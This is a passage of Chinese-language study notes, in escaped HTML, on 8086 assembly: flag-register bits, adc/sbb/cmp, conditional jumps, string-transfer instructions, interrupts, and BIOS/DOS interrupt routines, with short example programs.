    //可以将add指令进行的运算当做无符号数的运算，也可以当做有符号数计算(-127+1)，结果为-126(10000010B)。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;SF标识，就是CPU对符号数运算结果的一种记录，它记录数据的正负，在我们将数据当作有符号数来运算的时候，可以通过它来得知结果的正负。如果我们将数据当作无符号数来运算，SF的值则没有意义。&lt;/p&gt;

&lt;h4 id=&quot;cf标志&quot;&gt;CF标志&lt;/h4&gt;

&lt;p&gt;flag的第0位是CF，进位标志位。一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高为的借位值。&lt;/p&gt;

&lt;p&gt;对于位数为N的无符号数来说，其对应的二进制信息的最高位，即第N-1位，就是它的最高有效位。而假象存在的第N位，就是相对于最高有效位的更高位&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;7&lt;/th&gt;
      &lt;th&gt;6&lt;/th&gt;
      &lt;th&gt;5&lt;/th&gt;
      &lt;th&gt;4&lt;/th&gt;
      &lt;th&gt;3&lt;/th&gt;
      &lt;th&gt;2&lt;/th&gt;
      &lt;th&gt;1&lt;/th&gt;
      &lt;th&gt;0&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;假想的更高位&lt;/td&gt;
      &lt;td&gt;0（最高有效位）&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;当两个数据相加的时候，有可能产生从最高有效位向更高位的进位。这个进位值就用CF来保存
如:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,98H
    add al,al	//执行后al=30,CF=1,CF记录了从最高有效位向更高位的进位值
    add al,al	//执行后al=60,CF=0,CF记录了从最高有效位向更高位的进位值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;而当两个数据做减法的时候，有可能向更高位借位。比如，两个8位数据：97H-98H,将产生借位，借位后相当于197H-98H,而flag的CF位也可以用来记录这个借位值。
如:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,97H
    sub al,98H   //执行后al=FFH，CF=1，CF记录了向更高位的借位值
    sub al,al    //执行后al=0，CF=0，CF记录了向更高位的借位值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;of标志&quot;&gt;OF标志&lt;/h4&gt;

&lt;p&gt;在进行有符号运算的时候，如果结果超过了机器所能表示的范围称为溢出。&lt;/p&gt;

&lt;p&gt;8位的寄存器有效范围是-128~127，16位寄存器的有效范围是-32768~32767。如果运算结果超出了机器所能表达的范围，将产生溢出。
如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,98
    add al,99
    //执行后将产生溢出，al=al+99=98+99=197
    //197超过了8位有符号数的范围：-128~127
    //得到的结果是al=0C5H,因为是有符号数的运算，所以al存的是补码，C5H是有符号数的-59，98-99=-59显然是不对的。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;面对这种情况，flag的第11位OF（溢出标志位）就起作用了。
如果发生了溢出OF=1；如果没有OF=0。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CF是对无符号数运算有意义的标志位&lt;/li&gt;
  &lt;li&gt;OF是对有符号数运算有意义的标志位。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;adc指令&quot;&gt;adc指令&lt;/h4&gt;

&lt;p&gt;adc是带进位加法指令，它利用了CF位上记录的进位值。&lt;/p&gt;

&lt;p&gt;指令格式：adc 操作对象1，操作对象2
功能：操作对象1 = 操作对象1+操作对象2+CF
&lt;code class=&quot;highlighter-rouge&quot;&gt;adc ax，bx&lt;/code&gt;实现功能&lt;code class=&quot;highlighter-rouge&quot;&gt;ax=ax+bx+CF&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,2
    mov bx,1
    sub bx,ax
    adx ax,1
    //执行后ax=4，adc执行时相当于ax+1+CF=2+1+1=4
    
    mov ax,1
    add ax,ax
    adc ax,3
    //执行后ax=5，adc执行时相当于ax+3+CF=2+3+0=5
    
    mov al,98H
    add al,al
    adc al,3
    //执行后al=34，adc执行时相当于al+3+CF=30H+3+1=34H
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以看出&lt;code class=&quot;highlighter-rouge&quot;&gt;adc&lt;/code&gt;指令比&lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt;指令多加了一个CF位的值。CF的值有adc指令前面的指令决定的。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;adc&lt;/code&gt;指令是用来进行加法的第二步运算的。add和adc指令的配合能对更大的数据进行加法运算。&lt;/p&gt;

&lt;p&gt;例0198H和0183H相加，可以分为两步来进行&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.低位相加         				  add al,bl
2.高位相加再加上低位相加产生的进位值。adc ah,bh
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;adc就是用来进行第二步的，会自动帮我们加上进位值CF。（add指令执行后，CF表示低位相加的进位置）&lt;/p&gt;

&lt;h4 id=&quot;sbb指令&quot;&gt;sbb指令&lt;/h4&gt;

&lt;p&gt;和adc指令类似，通过CF位来记录借位值。&lt;/p&gt;

&lt;p&gt;指令格式：sbb 操作对象1，操作对象2
功能：操作对象1 = 操作对象1-操作对象2-CF
&lt;code class=&quot;highlighter-rouge&quot;&gt;sbb ax,bx&lt;/code&gt;实现的功能是&lt;code class=&quot;highlighter-rouge&quot;&gt;ax=ax-bx-CF&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;利用sbb指令可以对任意大数据进行减法运算
如：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //计算003E1000H-00202000H,结果放在ax，bx中
    mov bx,1000H
    mov ax,003EH
    sub bx,2000H//如果这里借位了，CF为1
    sbb ax,0020H//减去低位的借位值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;cmp指令&quot;&gt;cmp指令&lt;/h4&gt;

&lt;p&gt;cmp是比较指令，功能相当于减法指令，只是不保存结果。cmp比较指令执行后，将对标志寄存器产生影响，其他指令通过标识位来得知比较结果。&lt;/p&gt;

&lt;p&gt;指令格式：cmp 操作对象1，操作对象2
功能：计算操作对象1-操作对象2 当不保存结果，仅设置标识寄存器。&lt;/p&gt;

&lt;p&gt;cmp ax,bx&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;结果&lt;/th&gt;
      &lt;th&gt;减法运算&lt;/th&gt;
      &lt;th&gt;标志状态&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;ax=bx&lt;/td&gt;
      &lt;td&gt;ax-bx=0&lt;/td&gt;
      &lt;td&gt;zf=1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ax≠bx&lt;/td&gt;
      &lt;td&gt;ax-bx≠0&lt;/td&gt;
      &lt;td&gt;zf=0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ax&amp;lt;bx&lt;/td&gt;
      &lt;td&gt;ax-bx将借位&lt;/td&gt;
      &lt;td&gt;cf=1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ax≥bx&lt;/td&gt;
      &lt;td&gt;ax-bx不借位&lt;/td&gt;
      &lt;td&gt;cf=0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ax&amp;gt;bx&lt;/td&gt;
      &lt;td&gt;ax-bx不借位，结果也不为0&lt;/td&gt;
      &lt;td&gt;cf=0;zf=0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ax≤bx&lt;/td&gt;
      &lt;td&gt;ax-bx即可能借位，结果可能为0&lt;/td&gt;
      &lt;td&gt;cf=1;zf=1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;这个比较的设计思路是通过减法运算，影响标识寄存器，来得到大小。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;标志状态&lt;/th&gt;
      &lt;th&gt;结果&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;zf=1&lt;/td&gt;
      &lt;td&gt;ax=bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;zf=0&lt;/td&gt;
      &lt;td&gt;ax≠bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cf=1&lt;/td&gt;
      &lt;td&gt;ax&amp;lt;bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cf=0&lt;/td&gt;
      &lt;td&gt;ax≥bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cf=0;zf=0&lt;/td&gt;
      &lt;td&gt;ax&amp;gt;bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cf=1;zf=1&lt;/td&gt;
      &lt;td&gt;ax≤bx&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;前面的是无符号数的规则，下面看看有符号数&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sf=1;of=0 没有溢出，逻辑正负=实际正负，ab&amp;lt;bh。

sf=1;of=1 有溢出，逻辑正负≠实际正负,因sf=1，实际结果为负，又有溢出，表示是溢出导致的结果为负。逻辑上必然为正，ah&amp;gt;bh。

sf=0;of=1 有溢出，逻辑正负≠实际正负，实际结果为正，又有溢出，表示是溢出导致的结果为正，逻辑上必然为负，ah&amp;lt;bh。

sf=0,of=0 没有溢出，逻辑正负=实际正负，sf=0实际非负，逻辑也非负，ah≥bh

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;检测比较结果的条件转移指令&quot;&gt;检测比较结果的条件转移指令&lt;/h4&gt;

&lt;p&gt;jcxz是一个条件转移指令，它可以检测cx中的数值，如果cx=0，就修改IP，否则什么也不做。所有条件转移指令的转移位移都是-128~127。&lt;/p&gt;

&lt;p&gt;除了jcxz之外，CPU还提供了其他条件转移指令，大多数条件转移指令都检测标志寄存器的相关标志位来决定是否修改IP。
通常检测被cmp指令影响的那些标志位，所以这些条件指令通常和cmp配合使用。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;指令&lt;/th&gt;
      &lt;th&gt;含义&lt;/th&gt;
      &lt;th&gt;检测的标志位&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;je&lt;/td&gt;
      &lt;td&gt;等于则转移&lt;/td&gt;
      &lt;td&gt;zf=1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;jne&lt;/td&gt;
      &lt;td&gt;不等于则转移&lt;/td&gt;
      &lt;td&gt;zf=0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;jb&lt;/td&gt;
      &lt;td&gt;低于则转移&lt;/td&gt;
      &lt;td&gt;cf=1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;jnb&lt;/td&gt;
      &lt;td&gt;不低于则转移&lt;/td&gt;
      &lt;td&gt;cf=0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ja&lt;/td&gt;
      &lt;td&gt;高于则转移&lt;/td&gt;
      &lt;td&gt;cf=0且zf=0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;jna&lt;/td&gt;
      &lt;td&gt;不高于则转移&lt;/td&gt;
      &lt;td&gt;cf=1或zf=1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;e:表示equal
ne:表示not equal
b:表示below
nb:表示not below
a:表示above
na:表示not above&lt;/p&gt;

&lt;p&gt;例：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //实现ah=bh则ah=ah+ah，否则ah=ah+bh
    cmp ah,bh    //比较ah和bh改变对应的标志位
    je s		 //标志位符合等于跳转到s标号执行
    add ah,bh	 //标志位不符合等于执行这里
    jmp short ok //跳过s标号的语句
  s:add ah,ah
  ok:....
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;df标志和串传送指令&quot;&gt;DF标志和串传送指令&lt;/h4&gt;

&lt;p&gt;flag的第10位是DF，方向标志位，在串处理指令中，控制每次操作后si、di的增减。
df=0 每次操作后si、di递增
df=1 每次操作后si、di递减&lt;/p&gt;

&lt;p&gt;串传送指令
格式：movsb
功能：执行movsb相当于执行以下步骤&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    1.es*16+di=ds*16+si
    2.如果df=0则 si=si+1,di=di+1
    3.如果df=1则 si=si-1,di=di-1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;也可以按字来传送
格式：movsw
将ds:si指向的内存单元中的字送入es:di中，然后根据标识寄存器df位的值，将si和di加2或减2。&lt;/p&gt;

&lt;p&gt;相当于&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov es:[di],word ptr ds:[si]
	如果df=0
    add si,2
    add di,2
    
    如果df=1
    sub si,2
    sub di,2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;一般情况下movsb和movsw进行的是串传送操作中的一个步骤，需要和rep配合使用。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    rep movsb//循环调用movsb，循环cx次

    //和下面代码功能一样
    s:movsb
      loop s
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;由于flag的df位决定这串传送指令执行后，si和di的改变方向，我们需要提前设置好df位的值。
8086提供了2条指令来对df位进行设置。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    cld指令：将标志寄存器的df位置0
    std指令：将标志寄存器的df位置1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;例:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //将data段的第一个字符串复制到它后面的空间
    data segment
      db 'Welcome to masm!'
      db 16 dup (0)
    data ends
    
    code segment
      mov ax,data  //设置数据的起始位置
      mov ds,ax
      mov si,0
      mov es,ax    //设置数据的目标位置
      mov di,16    
      mov cx,16    //设置循环次数
      cld          //设置方向，si和di递增
      rep movsb    //开始循环传送
    code ends
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;pushf和popf&quot;&gt;pushf和popf&lt;/h4&gt;

&lt;p&gt;pushf的功能是将标志寄存器的值压栈，而popf是从栈中取出数据送入标志寄存器。&lt;/p&gt;

&lt;h4 id=&quot;标志寄存器在debug中的表示&quot;&gt;标志寄存器在Debug中的表示&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;标志&lt;/th&gt;
      &lt;th&gt;值为1的标记&lt;/th&gt;
      &lt;th&gt;值为0的标记&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;of&lt;/td&gt;
      &lt;td&gt;OV&lt;/td&gt;
      &lt;td&gt;NV&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;sf&lt;/td&gt;
      &lt;td&gt;NG&lt;/td&gt;
      &lt;td&gt;PL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;zf&lt;/td&gt;
      &lt;td&gt;ZR&lt;/td&gt;
      &lt;td&gt;NZ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;pf&lt;/td&gt;
      &lt;td&gt;PE&lt;/td&gt;
      &lt;td&gt;PO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cf&lt;/td&gt;
      &lt;td&gt;CY&lt;/td&gt;
      &lt;td&gt;NC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;df&lt;/td&gt;
      &lt;td&gt;DN&lt;/td&gt;
      &lt;td&gt;UP&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;内中断&quot;&gt;内中断&lt;/h3&gt;

&lt;p&gt;当CPU内部发生以下事情的时候，将产生相应的中断信息。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;除法错误，如执行div指令产生的除法移除。中断码：0&lt;/li&gt;
  &lt;li&gt;单步执行。中断码：1&lt;/li&gt;
  &lt;li&gt;执行into指令。中断码：4&lt;/li&gt;
  &lt;li&gt;执行int指令。中断码为指令携带，&lt;code class=&quot;highlighter-rouge&quot;&gt;int n&lt;/code&gt;，终端吗即为n&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;中断向量表中存储了中断码对应的处理程序的入口地址。
中断向量表在内存中保存，其中存放了256个中断源所对应的中断处理程序的入口。CPU通过中断码就能找到对应的处理程序。
在8086中，中断向量表指定放在内存地址0处，从0000:0000到0000:03FF的1024个单元中。不能放在别处。&lt;/p&gt;

&lt;p&gt;8086收到中断信息后，中断过程&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;从中断信息中取得中断类型码。&lt;/li&gt;
  &lt;li&gt;标志寄存器的值入栈（因为中断过程中要改变标志寄存器的值，所有先将其保存在栈中）。&lt;/li&gt;
  &lt;li&gt;设置标识寄存器的第8位TF和第9位IF的值为0&lt;/li&gt;
  &lt;li&gt;CS的内容入栈&lt;/li&gt;
  &lt;li&gt;IP的内容入栈&lt;/li&gt;
  &lt;li&gt;从内存地址为(中断类型码&lt;em&gt;4)和(中断类型码&lt;/em&gt;4+2)的两个字单元中读取中断处理程序的入口，设置IP和CS。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;中断处理程序和iret指令&quot;&gt;中断处理程序和iret指令&lt;/h4&gt;

&lt;p&gt;中断处理程序的编写方法和子程序比较相似&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保存用的的寄存器&lt;/li&gt;
  &lt;li&gt;处理中断&lt;/li&gt;
  &lt;li&gt;恢复用到的寄存器&lt;/li&gt;
  &lt;li&gt;用iret指令返回&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iret&lt;/code&gt;实现了下面的功能&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    pop IP
    pop CS
    popf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;单步中断&quot;&gt;单步中断&lt;/h4&gt;

&lt;p&gt;CPU执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。单步中断的类型码为1.则中断过程如下。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;取得中断类型码1&lt;/li&gt;
  &lt;li&gt;标志寄存器入栈，TF、IF设置为0&lt;/li&gt;
  &lt;li&gt;CS、IP入栈&lt;/li&gt;
  &lt;li&gt;IP=1&lt;em&gt;4，CS=1&lt;/em&gt;4+2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Debug程序的T命令就是通过这个实现的。使用t命令执行指令时，Debug将TF设置为1。这条指令执行完后，引发单步中断，执行单步中断处理程序。&lt;/p&gt;

&lt;p&gt;CPU提供单步中断功能的原因就是，为单步跟踪程序的执行过程，提供了实现机制。&lt;/p&gt;

&lt;p&gt;一些情况下即使发生中断，也不会响应。
例如当执行完想ss寄存器传送数据的指令后，即便是发生中断，CPU也不会响应。这样做的主要原因是，ss:sp联合指向栈顶，而对它们的设置应该连续完成。如果在执行完设置ss的指令后，CPU响应中断，引发中断过程，要在栈中压入标志寄存器、CS和IP的值。而ss改变，sp并未改变，ss:sp指向的不是正确的栈顶，将引起错误。
我们应该利用这个特性，将设置ss和sp的指令连续存放，使得设置sp的指令紧接着设置ss的指令执行，而在此之间CPU不会引发中断过程。&lt;/p&gt;

&lt;p&gt;如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //将栈顶设置为1000:0
    mov ax,1000h
    mov ss,ax
    mov sp,0
    而不应该
    mov ax,1000h
    mov ss,ax
    mov ax,0
    mov sp,0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;int指令&quot;&gt;int指令&lt;/h3&gt;

&lt;p&gt;格式：&lt;code class=&quot;highlighter-rouge&quot;&gt;int n&lt;/code&gt;。n为中断类型码&lt;/p&gt;

&lt;p&gt;可以在程序中使用int 指令调用任何一个中断的中断处理程序。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt;配合&lt;code class=&quot;highlighter-rouge&quot;&gt;iret&lt;/code&gt;配合使用与&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;指令和&lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;指令的配合使用有相似的思路。&lt;/p&gt;

&lt;h4 id=&quot;bios和dos中断例程的安装过程&quot;&gt;BIOS和DOS中断例程的安装过程&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;开机后,CPU加电，初始化CS=0FFFFH,IP=0,自动从FFFF:0单元开始执行程序。FFFF:0处有一条跳转指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序。&lt;/li&gt;
  &lt;li&gt;初始化程序将建立BIOS所支持的中断向量，即将BIOS提供的中断例程的入口地址登记在中断向量表中。&lt;/li&gt;
  &lt;li&gt;硬件系统检测和初始化完成后，调用int 19h进行操作系统的引导，从此将计算机交由操作系统控制。&lt;/li&gt;
  &lt;li&gt;DOS启动后，除完成其他工作外，还将它所提供的中断例程转入内存，并建立相应的中断向量。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bios中断例程的应用&quot;&gt;BIOS中断例程的应用&lt;/h4&gt;

&lt;p&gt;int 10h 中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的程序。&lt;/p&gt;

&lt;p&gt;设置光标位置&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ah,2    //设置用int 10h中断例程里面的2号子程序
    mov bh,0    //第0页
    mov dh,5    //行号
    mov dl,12   //列号
    int 10h
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在光标位置显示字符&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ah,9    //9号子程序，在光标位置显示字符
    mov al,'a'  //要显示的字符
    mov bl,7    //颜色
    mov bh,0    //第0页
    mov cx,3    //字符重复个数
    int 10h     //
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;bl中颜色的格式如下&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;7&lt;/th&gt;
      &lt;th&gt;6&lt;/th&gt;
      &lt;th&gt;5&lt;/th&gt;
      &lt;th&gt;4&lt;/th&gt;
      &lt;th&gt;3&lt;/th&gt;
      &lt;th&gt;2&lt;/th&gt;
      &lt;th&gt;1&lt;/th&gt;
      &lt;th&gt;0&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;BL&lt;/td&gt;
      &lt;td&gt;R&lt;/td&gt;
      &lt;td&gt;G&lt;/td&gt;
      &lt;td&gt;B&lt;/td&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;R&lt;/td&gt;
      &lt;td&gt;G&lt;/td&gt;
      &lt;td&gt;B&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;闪烁&lt;/td&gt;
      &lt;td&gt;背景&lt;/td&gt;
      &lt;td&gt;背景&lt;/td&gt;
      &lt;td&gt;背景&lt;/td&gt;
      &lt;td&gt;高亮&lt;/td&gt;
      &lt;td&gt;前景&lt;/td&gt;
      &lt;td&gt;前景&lt;/td&gt;
      &lt;td&gt;前景&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;若想显示红的高亮将bl设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;11001010b&lt;/code&gt;就可以了。&lt;/p&gt;

&lt;h4 id=&quot;dos中断例程应用&quot;&gt;DOS中断例程应用&lt;/h4&gt;

&lt;p&gt;int 21h就是DOS提供的中断例程。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ah,4ch   //表示调用4ch号子程序
    mov al,0     //返回值
    int 21h
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;int 21h在光标位置显示字符串的功能&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ds:dx 指向字符串   //要显示的字符串用$作为结束符
    mov ah,9         //使用第9号子程序
    int 21h
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在屏幕5行12列显示字符串&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    
    data segment
      db 'Welcome to masm','$'
    data ends
    
    code segment
      start:mov ah,2    //选择设置光标功能
            mov bh,0    //设置页数
            mov dh,5    //行数
            mov dl,12   //列数
            int 10h     //执行，移动光标
            
            mov ax,data //设置数据
            mov ds,ax   
            mov dx,0    //ds:dx指向字符串的首地址data:0
            mov ah,9    //选择9号功能，显示字符串
            int 21h     //执行
            
            mov ax,4c00h//相当于设置mov ah,4ch
            int 21h
    code ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;端口&quot;&gt;端口&lt;/h3&gt;

&lt;p&gt;在PC机系统中，和CPU通过总线相连的芯片除了各种存储器外，还有以下3种芯片&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;各种借口卡(网卡，显卡)上的接口芯片，它们控制接口卡进行工作。&lt;/li&gt;
  &lt;li&gt;主板上的接口芯片，CPU通过它们对部分外设进行访问。&lt;/li&gt;
  &lt;li&gt;其他芯片，用来存储相关的系统信息，或进行相关的输入输出处理。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些芯片中，都有一组可以有CPU读写的寄存器。这些寄存器，它们在物理上可能处于不同的芯片中，但它们在一下两点上相同。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;都和CPU的总线相连，当然这种连接是通过它们所在的芯片进行的。&lt;/li&gt;
  &lt;li&gt;CPU对它们进行读或写的时候都通过控制线向它们所在的芯片发出端口读写命令。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可见，从CPU的角度，将这些寄存器都当做端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。&lt;/p&gt;

&lt;p&gt;CPU可以直接读写一下3个地方的数据&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CPU内部寄存器&lt;/li&gt;
  &lt;li&gt;内存单元&lt;/li&gt;
  &lt;li&gt;端口&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;端口的读写&quot;&gt;端口的读写&lt;/h4&gt;

